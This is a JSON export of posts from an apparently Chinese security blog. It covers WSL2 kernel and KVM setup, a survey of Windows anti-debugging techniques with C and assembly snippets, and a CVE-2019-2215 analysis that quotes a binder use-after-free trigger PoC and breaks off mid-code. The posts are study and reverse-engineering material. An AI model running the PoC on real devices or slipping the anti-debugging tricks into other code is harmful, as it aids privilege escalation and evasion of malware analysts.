[{"content":"WSL2使用技巧 0x00 常用配置 0x01 自编译内核 0x02 使用USBIP连接USB设备 0x03 使用VHD解决卡顿问题 0x04 在WSL2上编译AOSP 0x05 使用WSLg图形界面 0x06 使用CAN/CANFD协议 ","date":"2023-12-01T00:00:00Z","permalink":"https://ykiko.top/p/wsl2%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"WSL2使用技巧"},{"content":"博客正常运行中 H1 本博客基于Notion页面自动生成\nPublish地址：https://kuekiko.notion.site/14acc4eb33a24554a9224b2eafb61140?v=e0b848538c0c43108feebfcb8107f9c5\u0026amp;pvs=4\nNotion自动生成测试\n本文的Notion链接为：https://kuekiko.notion.site/6e834359fd8445b7b5005bc7c58d6c57?pvs=4\n每10分钟更新一次\n","date":"2023-09-01T00:00:00Z","permalink":"https://ykiko.top/p/%E5%8D%9A%E5%AE%A2%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%E4%B8%AD/","title":"博客正常运行中"},{"content":"Windows反调试总结 0x00 前言 在对Windows程序进行分析时，会发现很多软件会加入反调试技术防止核心功能被破解，以及在进行恶意软件分析时也有很多样本无法直接进行调试。\n本文介绍了常用的反破解和反逆向保护技术，也就是Windows平台中的反调试方法。攻和防其实是相对的，只有了解了调试的原理，才能更深入的进行对抗，\n0x01 PEB反调试 (1) PEB块 PEB（环境进程块）是Windows操作系统中每个进程都有的一个数据结构，它包含了进程相关的信息。PEB是在用户模式下的一个结构，与在内核模式下的EPROCESS结构相对应。PEB为进程提供了关于其自身的信息，例如加载的模块列表、启动参数、程序的基地址等。\n32位程序中在fs:[0x30]处可以读取到PEB的指针，可以使用*PEB指针进行读取。\n64位程序中PEB定义在gs:[0x60]处，但通常会有地址随机化，所以一般都是先读取TEB（gs:[0x30]）再读取PEB。\nPEB中有一些字段（标志位）能够被用作检测是否被调试：\n**BeingDebugger：**bool字段，当进程被调试时，会被设置为true。\n1 2 3 4 5 6 7 // 检测代码，常见 PEB* peb = (PEB*)__readfsdword(0x30); if (peb-\u0026gt;BeingDebugged) { ExitProcess(0); } // 汇编中类似 mov eax,dword ptr fs:[0x30] NtGlobalFlag：包含了与调试和堆相关的标志，当进程在调试器下运行时，某些标志（如FLG_HEAP_ENABLE_TAIL_CHECK、FLG_HEAP_ENABLE_FREE_CHECK和FLG_HEAP_VALIDATE_PARAMETERS）可能会被设置。该字段在32位程序中位于PEB的0x68的偏移处，在64位程序中位于0xBC偏移处。\n一般来说，在32位程序中(NtGlobalFlag \u0026amp; 0x70) == True 则说明被调试状态。\n1 2 3 4 5 6 7 8 9 10 FLG_HEAP_ENABLE_TAIL_CHECK (0x10) FLG_HEAP_ENABLE_FREE_CHECK (0x20) FLG_HEAP_VALIDATE_PARAMETERS (0x40) // 检测的汇编代码 mov eax, fs:[30h] mov al, [eax+68h] and al, 70h cmp al, 70h je being_debugged **LoaderLock：**模块加载和卸载的锁。尝试在没有获取这个锁的情况下访问加载的模块列表可能会导致程序崩溃。\n(2) IsDebuggerPresent 除了直接读取PEB判断是否被调试以外，还可以通过使用kernel32.dll中的IsDebuggerPresent这个API进行判断。这个API的实际原理也是读取PEB中的**BeingDebugged**** **字段进行判断。\n直接调用IsDebuggerPresent() 如果为返回值为True则为调试状态、如果为False则为没有被调试\nbRet = IsDebuggerPresent();\n0x02 Nt (1) CheckRemoteDebuggerPresent CheckRemoteDebuggerPresent 是Windows API中的一个函数，用于检测指定的进程是否由调试器调试。\n实际是调用NtQueryInformationProcess的ProcessDebugPort参数来判断的。\n1 2 3 4 5 // debugapi.h BOOL CheckRemoteDebuggerPresent( HANDLE hProcess, PBOOL pbDebuggerPresent ); 参数\nhProcess: 这是一个句柄，指向要检查的进程。如果此句柄是当前进程的句柄，函数将检查当前进程。\npbDebuggerPresent: 这是一个指向变量的指针，该变量在函数返回时将被设置为 TRUE（如果进程正在被调试）或 FALSE（如果进程没有被调试）。\n如果函数成功，返回值为非零。如果函数失败，返回值为零。\n1 2 3 4 5 6 7 //使用代码 BOOL bIsDebugged = FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(), \u0026amp;bIsDebugged); if (bIsDebugged) { printf(\u0026#34;The process is being debugged.\\n\u0026#34;); ExitProcess(1); } (2) NtQuerySystemInformation **NtQuerySystemInformation是Windows NT内核模式函数，用于查询各种系统信息。这个函数在ntdll.dll**中定义，但它主要是为内部使用和驱动程序设计的。\n实际是查询SystemKernelDebuggerInformation\n1 2 3 4 5 6 NTSTATUS NtQuerySystemInformation( SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength ); SystemInformationClass：一个枚举值，指定要查询的系统信息的类型。\nSystemInformation：一个指针，指向一个缓冲区，该缓冲区用于接收请求的系统信息。\nSystemInformationLength：指定**SystemInformation**缓冲区的大小（以字节为单位）。\nReturnLength：一个可选的输出参数，如果提供，它将接收实际返回的信息的大小（以字节为单位）。\n如果函数成功，返回状态码**STATUS_SUCCESS**。如果函数失败，返回一个NTSTATUS错误代码。\n使用**NtQuerySystemInformation**** **进行反调试，有以下方法：\n检查进程的父进程:\n使用**SystemProcessInformation**信息类，可以获取所有系统进程的列表。\n检查当前进程的父进程是否是调试器（例如：Visual Studio, OllyDbg, **WinDbg**等）。\n检查调试对象句柄:\n使用**SystemHandleInformation**信息类，可以获取系统中所有打开的句柄。\n检查是否有与调试相关的句柄（例如，调试对象句柄）。\n检查调试端口:\n使用**SystemKernelDebuggerInformation**信息类，可以检查系统是否有内核调试器连接。\n如果返回的结构中**KernelDebuggerEnabled字段为TRUE**，则可能存在调试器。\n检查系统时间:\n使用**SystemTimeOfDayInformation**信息类，可以查询系统时间。\n通过比较两次查询之间的时间差，可以检测到调试器的存在，因为在单步执行或暂停执行时，时间差可能会异常地大。\n检查线程的上下文:\n使用**SystemThreadInformation**信息类，可以获取线程的上下文。\n检查线程的上下文中的某些标志，如**TrapFlag**，以确定是否在单步模式下运行，这是调试的一个标志。\n(3) NtClose 其实就是一个CloseHandle、如果有调试器的情况下关闭一个无效的句柄则会触发一个异常、可以用VEH进行接收并处理\n如果有调试器存在的话NtClose就会触发一个异常、则可以捕获这个异常 来判断是否被调试器调试状态\n(4) NtQueryInformationProcess **NtQueryInformationProcess**是一个Windows Native API函数，它用于查询与指定进程相关的信息。\n1 2 3 4 5 6 7 NTSTATUS NtQueryInformationProcess( HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); ProcessHandle：要查询的进程的句柄。\nProcessInformationClass：要查询的信息的类型。可以取值**ProcessDebugPort、ProcessDebugObjectHandle、ProcessDebugFlags**等。\nProcessInformation：一个指针，指向接收查询结果的缓冲区。\nProcessInformationLength：缓冲区的大小。\nReturnLength：如果非NULL，它是一个指针，指向一个变量，该变量接收返回的信息的实际大小。\n对于反调试，一般检查ProcessInformationClass中的值：\n检查**DebugPort**:\n使用**ProcessDebugPort**信息类，可以检查进程是否被调试。\n如果返回的值不为0，那么进程可能正在被调试。\n检查**DebugFlags**:\n使用**ProcessDebugFlags**信息类，可以检查进程的调试标志。\n如果返回的值为0，那么进程可能正在被调试。\n检查**DebugObject**:\n使用**ProcessDebugObjectHandle**信息类，可以检查进程是否有调试对象句柄。\n如果返回的句柄有效，那么进程可能正在被调试。\n检查父进程:\n使用**ProcessBasicInformation**信息类，可以获取进程的基本信息，其中包括父进程的ID。\n检查父进程是否是调试器（例如：Visual Studio, OllyDbg, **WinDbg**等）。\n(5) NtSetInformationThread NtSetInformationThread 是 Windows 的一个 Native API 函数，它允许开发者设置关于指定线程的各种信息。\n1 2 3 4 5 6 NTSTATUS NtSetInformationThread( HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength ); ThreadHandle：要设置信息的线程的句柄。\nThreadInformationClass：要设置的信息的类型。常用ThreadBasicInformation、ThreadHideFromDebugger。\nThreadInformation：一个指针，指向包含要设置的信息的缓冲区。\nThreadInformationLength：缓冲区的大小。\n返回**STATUS_SUCCESS**** 则**操作成功，其他 NTSTATUS 值则操作失败。\n在反调试中使用 ThreadHideFromDebugger 信息类。当一个线程使用这个信息类调用 NtSetInformationThread 时，该线程会变得对调试器不可见。这意味着，如果一个调试器试图暂停、检查或修改这个线程，它会失败。\n(6) NtDuplicateObject NtDuplicateObject 是 Windows 的一个 Native API 函数，用于复制对象句柄。这允许进程创建一个新的句柄，该句柄与原始句柄具有相同的访问权限，并指向相同的内核对象。\n1 2 3 4 5 6 7 8 9 NTSTATUS NtDuplicateObject( HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options ); SourceProcessHandle：源进程的句柄，其中包含要复制的对象句柄。\nSourceHandle：要复制的对象的句柄。\nTargetProcessHandle：目标进程的句柄，其中将创建新的对象句柄。\nTargetHandle：指向新复制的对象句柄的指针。\nDesiredAccess：新句柄的请求访问权限。\nHandleAttributes：新句柄的属性。\nOptions：控制复制操作的选项。\n返回**STATUS_SUCCESS**** 则**操作成功，其他 NTSTATUS 值则操作失败。\n**NtDuplicateObject**在内核中内核会检测是否有调试器、有调试器则发出一个异常\n(7) NtQueryObejct NtQueryObject 是 Windows 的一个 Native API 函数，用于查询系统对象的信息。这个函数提供了一种方法来获取关于系统中对象（如文件、句柄、进程、线程等）的详细信息。\n1 2 3 4 5 6 7 NTSTATUS NtQueryObject( HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength ); Handle：要查询的对象的句柄。\nObjectInformationClass：要查询的信息的类型。这是一个枚举值，可以是 ObjectNameInformation、ObjectTypeInformation 等。\nObjectInformation：指向接收查询结果的缓冲区的指针。\nObjectInformationLength：缓冲区的大小。\nReturnLength：实际返回的信息的大小。\n返回**STATUS_SUCCESS**** 则**操作成功，其他 NTSTATUS 值则操作失败。\n反调试主要是使用该API查询调试器的句柄是否存在来确定是否被调试。\n0x03 TLS反调试 TLS全称Thread Local Storage，即线程局部存储。TLS是一种方法，通过这种方法，给定多线程进程中的每个线程可以分配位置来存储特定于线程的数据。通过TLS API (TlsAlloc)支持**动态绑定(运行时)特定于线程的数据。Win32和Microsoft c++编译器现在除了现有的API实现外，还支持静态绑定(加载时)**每个线程数据。\n在PE (Portable Executable) 文件格式中，存在一个TLS目录，其中包含指向一系列回调函数的指针。当一个线程开始或结束时，这些回调函数会被调用。更重要的是，这些回调在程序的入口点 (main 或 WinMain) 之前就会被调用。\n由于TLS回调在主程序入口点之前执行，因此它们可以用作反调试技术。调试器通常在主程序入口点上设置断点，但不会考虑TLS回调。因此，如果在TLS回调中放置反调试代码，那么在主程序开始执行之前，这些代码就会被执行。\n知道了TLS的原理，实现反调试只需要将其他反调试代码在TLS中实现即可。比如将**IsDebuggerPresent、NtQueryInformationProcess**** **等调试检测放到TLS中实现。\n0x04 时间差反调试 调试的时候，程序运行的时间会比正常运行时间久，所以我们可以根据运行时间的长短来判断是否运行在调试环境中。\n使用读取CPU时钟计数器、时间计数相关API，时间APIQueryPerformanceCounter、GetTickCount、GetSystemTime、GetLocalTime等\n反调试的实现方式为使用GetTickCount取启动时间，获得从系统启动到现在所有毫秒数。如果在中间进行单步调试、则时间差一定大于1000毫秒、即为调试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { DWORD start, end, elapsed; start = GetTickCount(); // 一些可能会被调试的代码 for (int i = 0; i \u0026lt; 1000000; i++); end = GetTickCount(); elapsed = end - start; if (elapsed \u0026gt; SOME_THRESHOLD) { printf(\u0026#34;Debugging detected!\\n\u0026#34;); exit(1); } // 正常的程序代码 return 0; } 0x05 其他一些反调试技巧 （1）STARTUPINFO STARTUPINFO 是一个结构体，它用于指定新进程的主窗口的外观（如窗口大小和位置）和行为（如标准输入/输出句柄）。当使用 CreateProcess() 函数创建新进程时，可以通过 STARTUPINFO 结构体来指定新进程的启动参数。\n程序正常启动时，大多数 STARTUPINFO 结构体的字段都会被设置为0或默认值。但是，当程序在调试器下启动时，某些字段可能会被设置为非零值，因为调试器可能会修改这些字段以控制被调试程序的行为。\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { STARTUPINFO si; GetStartupInfo(\u0026amp;si); if (si.cbReserved2 != 0 || si.lpReserved2 != NULL) { printf(\u0026#34;Debugging detected!\\n\u0026#34;); exit(1); } printf(\u0026#34;No debugging detected.\\n\u0026#34;); return 0; } （2）SedebugPrivilege SeDebugPrivilege 是一个特殊的权限，允许进程打开其他进程进行读写，即使这些进程是由其他用户创建的。这个权限通常只授予管理员和调试器，程序正常启动不会具备这个权限。\n系统启动的时候会启动一个核心进程csrss.exe，我们可以通过判断能否使用OpenProcess打开该进程来检查当前进程是否具有调试权限。有管理员权限和调试权限才打开这个 csrss.exe\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { DWORD csrssPID = 0; // 你需要获取到 csrss.exe 的 PID HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrssPID); if (hProcess != NULL) { printf(\u0026#34;SeDebugPrivilege detected!\\n\u0026#34;); CloseHandle(hProcess); } else { printf(\u0026#34;No SeDebugPrivilege detected.\\n\u0026#34;); } return 0; } （3）禁止键盘输入 在函数头部加上这个禁止键盘输入的函数、然后在函数尾部恢复这个键盘输入、函数执行非常快、所以感受不到键盘有时候被禁止输入！所以这个方法有利于反单步调试(单步单步跟着键盘就失灵了）这个可以与时间差反调试进行联合使用！\n（4）硬件断点检测 可以获取当前线程的上下文、当前判断当前的调试寄存器DR0\\DIR1\\DR2\\DIR3是否有值、如果这几个调试寄存器有值说明当前这个进程正在被调试\n1 2 3 4 5 6 7 8 9 CONTEXT pContext = {0}; pContext.EFlags = CONTEXT_ALL; if (GetThreadContext(NtCurrentThread, \u0026amp;pContext)) { if (pContext.Dr0 || pContext.Dr1 || pContext.Dr2 || pContext.Dr3) { OUTPRINTF(\u0026#34;DR寄存器(检测硬件断点)\u0026#34;, TRUE); } } （5）检测硬件断点的地址 异常方式检测硬件断点\n反抗硬件断点调试\nHOOK之后首先把DR寄存器全部清0然后再调用VEH、所以别人用的是你的VEH\nHOOK这个函数然后还原之前的硬件断点\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PUCHAR dwEip = (PUCHAR)ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Eip; //if (*dwEip == 0xCC) if(ExceptionInfo-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode == 0xC0000005)//0xCC就是不可读 { if (ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Dr0 || ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Dr1 || ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Dr2 || ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Dr3) { OUTPRINTF(\u0026#34;DR寄存器(检测到的硬件地址)\u0026#34;, TRUE); } else { OUTPRINTF(\u0026#34;DR寄存器(检测到的硬件地址)\u0026#34;, FALSE); } ExceptionInfo-\u0026gt;ContextRecord-\u0026gt;Eip += 3; return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH; （6）自内存CRC 对抗CRC:下内存硬件断点、然后一步一步跟踪、Nop掉CRC即可\n自内存CRC需要很早时期先计算一遍内存CRC校验和！然后后续在根据这个CRC校验值再来判断\n1 2 3 4 5 6 7 8 using namespace std; typedef struct _CRC_HASHI { PVOID m_pAddr; DWORD m_dwSize; DWORD m_dwHashVal; }CRC_HASHI,*PCRC_HASHI; vector\u0026lt;CRC_HASHI\u0026gt; g_crc_vtr; 反附加之前要先获取一次代码段的页面CRC校验和算出CRC、比如某些壳在链接的时候就已经算好了、这是最早的计算方式、越早越好\n以下是代码、获取页面CRC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 HMODULE ImageBase = 0; ImageBase = GetModuleHandle(NULL); PIMAGE_DOS_HEADER pDos = NULL; PIMAGE_NT_HEADERS pNt = NULL; PIMAGE_SECTION_HEADER pSection = NULL; DWORD dwStartAdr, dwSize; pDos = PIMAGE_DOS_HEADER((ULONG_PTR)ImageBase); if (pDos-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { return; } pNt = PIMAGE_NT_HEADERS((ULONG_PTR)ImageBase + pDos-\u0026gt;e_lfanew); if (pNt-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { return; } pSection = IMAGE_FIRST_SECTION(pNt); g_crc_vtr.clear(); for (size_t i = 0; i \u0026lt; pNt-\u0026gt;FileHeader.NumberOfSections; i++) { if (pSection-\u0026gt;Characteristics \u0026amp; IMAGE_SCN_MEM_EXECUTE) { CRC_HASHI ctx; //这里计算CRC值 dwStartAdr = pSection-\u0026gt;VirtualAddress + (ULONG_PTR)ImageBase; dwSize = pSection-\u0026gt;Misc.VirtualSize; ctx.m_pAddr = (PVOID)dwStartAdr; ctx.m_dwSize = dwSize; ctx.m_dwHashVal = crc32((const void*)ctx.m_pAddr, dwSize); g_crc_vtr.push_back(ctx); } pSection++; } 循环校验CRC\n1 2 3 PVOID pDbg = GetProcAddress(GetModuleHandle(L\u0026#34;ntdll.dll\u0026#34;), \u0026#34;DbgBreakPoint\u0026#34;); byte bRet = 0xC3; WriteProcessMemory(NtCurrentProcess, pDbg, \u0026amp;bRet, 1, 0); （7）DbgBreakPoint 调试器在附加的时候会走DbgBreakPoint函数、所以HOOK这个函数就可以改变调试器运转流程、从而达到反附加！\n1 2 3 PVOID pDbg = GetProcAddress(GetModuleHandle(L\u0026#34;ntdll.dll\u0026#34;), \u0026#34;DbgBreakPoint\u0026#34;); byte bRet = 0xC3; WriteProcessMemory(NtCurrentProcess, pDbg, \u0026amp;bRet, 1, 0); （8）注册表检测 当程序利用调试器时，程序的注册表中的 JIT 值会被修改我们可以检查注册表里面是否有对应字符串。\n解决 把 对应的字符串 修改为 0\n（9）窗口检测 FindWindow、EnumWindows 这两个函数 可以得到窗口的句柄。 判断窗口名称是否时对应的 字符串。\n解决 把 对应的字符串 修改为 0\n（10）父进程检测 正常启动 父进程为 **exeplorer.exe 。**调试启动 父进程为 调试器。\n利用 NtQueryInformationProcess 获得父进程的 PID\n可能只检查程序的父进程名字，可以把调试器名字改为 exeplorer.exe\n（11）异常处理 正常运行的进程发生异常时，在SEH(Structured Exception Handling)机制的作用下，OS会接收异常，然后调用进程中注册的SEH处理。但是，若进程正被调试器调试，那么调试器就会先于SEH接收处理。利用该特征可判断进程是正常运行还是调试运行，然后根据不同的结果执行不同的操作，这就是利用异常处理机制不同的反调试原理。\nINT3 异常 EXCEPTION_BREAKPOINT\n正常运行状态，则自动调用已经注册过的SEH; 若程序处于调试运行状态，则系统会停止运行程序将控制权转给调试器。\nSetUnhandledExceptionFilter()\n该函数会检查进程是否处于调试状态，若是，就把异常传递给调试器，否则就弹个错误对话框，然后结束程序\nINT 2D\n原为内核模式中用来触发断点异常的，也可以在用户模式下正常运行时触发异常.\n① 不会触发异常，只是忽略\n② INT 2D的下一条指令的第一个字节会被忽略。\n③ F7/F8单步命令跟踪INT 2D时，程序不会停在下条指令开始的地方，而是一直运行，直到遇到断点。\n（12）0xCC探测 __ 对应 INT 3 若是关键位置检测到该指令，即可判断进程处于调试状态。检测时要注意不是所有的位置都可以，因为0xCC既可以是INT 3指令，也可以是其他指令的操作数API断点 校验和 → 采用比较特殊代码区域(易被下断点的区域)的校验和的值\n（13）单步检测 检测TF或0xCC实现反调试。\nTF检测 → 当EFLAGS的TF标志位被置1时，CPU将进入单步执行模式CPU执行1条指令后即触发一个EXCEPTION_SINGLE_STEP异常，然后TF会自动清零 第1种：主动触发TF异常、与SEH结合使用探测调试器。\n（14） 自调试 和linux 一样程序不允许同时被两个调试器调试。可以自己先调试运行自己，防止被另一个调试器继续调试。\nCreateProcess\n进程第1次运行时会尝试访问同步内核对象，如果不存在，则说明当前进程第1次运行，创建一个内核对象，并以调试方式创建进程打开“自己”。这时若调试器首次调试运行进程则相当于在调试一个调试器，由于第2次运行的进程是被第1次运行的调试打开的，所以调试器也无法继续调试第2次运行的进程。\nDebugActiveProcess\n自调试除上节讲的CreateProcess()以调试方式打开进程外，还可以选择正常创建自身，然后马上附加创建进程的操作来实现。DebugActiveProcess()就可以做到这一点。\n参考文档 [原创]Windows最全反调试知识汇总-附实现代码-软件逆向-看雪-安全社区|安全招聘|kanxue.com\n【原创】反调试实战系列二 TLS反调试+CheckRemoteDebuggerPresent原理 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn\nWindows平台常见反调试技术梳理（上）-安全客 - 安全资讯平台 (anquanke.com)\nWindows平台常见反调试技术梳理（下）-安全客 - 安全资讯平台 (anquanke.com)\n","date":"2021-08-22T00:00:00Z","permalink":"https://ykiko.top/p/windows%E5%8F%8D%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93/","title":"Windows反调试总结"},{"content":"WSL2开启kvm 0x00 前言 之前想着用wsl2去跑qemu，发现很多内核pwn题给的环境需要开启-enable-kvm选项，还有自己编译的内核也没法，然而wsl2没法开启kvm，解决办法就是去把hype-v给关了，老老实实用vmware/vmbox开个虚拟机，这样每次都要切来切去很麻烦。\n直到看到vmware和vmbox都可以与hype-v并存，以为看到了曙光，没想到是没法开启虚拟化选项的。\n后来看到WSL上这个Issues，当时也没这么多评论，不过暂且能用脚本实现。不过还是很麻烦。\n最后看了这篇文章，跟着试了一遍，一直没报错，最后还是不行。某天又去看了看issuse，发现这个办法要最新阅览版。更新后一个新的发现就是wsl2速度明显变快了。。\n0x01 环境 Windows 10 2004 20175.1000\nWindows Feature Experience Pack 120.18201.0.0\nwsl2 - Ubuntu 20\nIntel i7-8550U\nWSL-Linux-kernel: 4.19.121-microsoft-standard\nqemu 5.0\n0x02 编译Kernel 1 2 3 4 5 sudo apt -y install build-essential libncurses-dev bison flex libssl-dev libelf-dev cpu-checker qemu-kvm tar -xf WSL2-Linux-Kernel-4.19.121-microsoft-standard.tar.gz cd WSL2-Linux-Kernel-4.19.104-microsoft-standard/ ## cp Microsoft/config-wsl .config 有bug 使用最新版commit已修复 make menuconfig .config文件用这个 或者这个\n确保里面的选项kvm的选项。\n这里可选的编译为\u0026lt; M \u0026gt; 模块或者\u0026lt; * \u0026gt; 内置，建议内置吗模块的话后续每次重启都得自己加载一次。\n确保Linux guest support enable选项。\n退出保存。\n1 make -j8 waitting…………\n1 2 3 4 cp arch/x86/boot/bzImage /mnt/c/Users/\u0026lt;username\u0026gt;/bzImage nano /mnt/c/Users/\u0026lt;username\u0026gt;/.wslconfig ### 如果是 \u0026lt;M\u0026gt; 模块编译 sudo make modules_install 1 2 3 4 5 [wsl2] nestedVirtualization=true kernel=C:\\\\Users\\\\\u0026lt;username\u0026gt;\\\\bzImage debugConsole=true ##可选 pageReporting=true ##可选 1 2 3 wsl.exe --shutdown Ubuntu wsl.exe -d Ubuntu nano /etc/modprobe.d/kvm-nested.conf mod加载的话还要写入：\n1 2 3 4 options kvm-intel nested=1 options kvm-intel enable_shadow_vmcs=1 options kvm-intel enable_apicv=1 options kvm-intel ept=1 之前模块编译的有bug版本的图 mount无法挂载。\n成功的图 可以挂载。。无需手动加载mod\n要先配置界面以及GPU支持可以参考这篇文章后续的部分，没这个需求。。\nissuse 还是会遇到奇奇怪怪的坑。\nAn error occurred mounting one of your file systems. Please run 'dmesg' for more details.\n报错信息：\n1 2 3 4 5 6 7 8 [ 2.268879] init: (1) ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/c (cache=mmap,noatime,msize=262144,trans=virtio,aname=drvfs;path=C:\\;uid=0;gid=0;symlinkroot=/mnt/ [ 2.268880] ) failed: 22 [ 2.277772] 9pnet: Could not find request transport: virtio [ 2.280962] init: (1) ERROR: MountPlan9WithRetry:282: mount drvfs on /mnt/d (cache=mmap,noatime,msize=262144,trans=virtio,aname=drvfs;path=D:\\;uid=0;gid=0;symlinkroot=/mnt/ [ 2.280964] ) failed: 22 [ 2.305491] init: (8) ERROR: CreateProcessParseCommon:874: Failed to translate D:\\openSRC\\WSL2-Linux-Kernel-4.19.121-microsoft-standard [ 2.312584] init: (8) ERROR: UtilTranslatePathList:2624: Failed to translate D:\\Life_Tools\\Sys_Tools\\cmder\\bin [ 2.319445] init: (8) ERROR: UtilTranslatePathList:2624: Failed to translate D:\\Life_Tools\\Sys_Tools\\cmder\\vendor\\bin 这是内核的问题，很坑的地方。是官网没切换新的config文件造成的，换成新的重新编译即可。具体看着这个issuse 修复\n重新编译内核。\n参考 https://boxofcables.dev/accelerated-kvm-guests-on-wsl-2/\nhttps://github.com/microsoft/WSL/issues/4193\n","date":"2020-07-24T00:00:00+08:00","permalink":"https://ykiko.top/p/wsl2%E5%BC%80%E5%90%AFkvm/","title":"WSL2开启kvm"},{"content":"CVE-2019-2215分析利用记录 0x00 前言 CVE-2019-2215最初是由syzbot(syzkaller bot)在2017年发现的一个bug，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。\nProject Zero的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该漏洞。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。\n0x01 分析环境 Android avd api29 x86_64\nkernel：q-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b\npixel Android 10 kernel 3.18\n0x02 漏洞分析 漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。\n原理分析 先看一个project-zero公开的poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* binder_poll() passes the thread-\u0026gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free. */ #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/epoll.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define BINDER_THREAD_EXIT 0x40046208ul int main() { int fd, epfd; struct epoll_event event = {.events = EPOLLIN}; fd = open(\u0026#34;/dev/binder\u0026#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, \u0026amp;event); //[1] ioctl(fd, BINDER_THREAD_EXIT, NULL); //[2] } 漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-\u0026gt;wait，导致UAF。\n既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。\nallocate 在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且fd-\u0026gt;pricate_data = binder_proc，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，图来源\nfree poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从fd-\u0026gt;private_data中释放binder_thread结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。\n1 2 3 4 5 6 7 8 static void binder_free_thread(struct binder_thread *thread) { BUG_ON(!list_empty(\u0026amp;thread-\u0026gt;todo)); binder_stats_deleted(BINDER_STAT_THREAD); binder_proc_dec_tmpref(thread-\u0026gt;proc); put_task_struct(thread-\u0026gt;task); kfree(thread); } use 在当前线程退出时，会自动调用epoll_ctl(epfd, DEL, fd, event)，这里面会调用到ep_remove(event_poll, ep_item)，这个方法里面会进行unlink wait queues双链表操作，其中的操作entry = wait-\u0026gt;entry;这里的指针指向已经释放的binder_thread-\u0026gt;wait。造成use after free。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 static void ep_remove_wait_queue(struct eppoll_entry *pwq) //这里的pwq就是我们已经释放掉的binder_thread { wait_queue_head_t *whead; rcu_read_lock(); whead = smp_load_acquire(\u0026amp;pwq-\u0026gt;whead); if (whead) remove_wait_queue(whead, \u0026amp;pwq-\u0026gt;wait); //进入remove_wait_queue rcu_read_unlock(); } void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { unsigned long flags; spin_lock_irqsave(\u0026amp;wq_head-\u0026gt;lock, flags); __remove_wait_queue(wq_head, wq_entry); //这里传入的第二个参数\u0026amp;pwq-\u0026gt;wait之前已经被释放 spin_unlock_irqrestore(\u0026amp;wq_head-\u0026gt;lock, flags); } static inline void __remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry) { list_del(\u0026amp;wq_entry-\u0026gt;entry); } static inline void list_del(struct list_head *entry) { __list_del_entry(entry); [...] } static inline void __list_del_entry(struct list_head *entry) { [...] 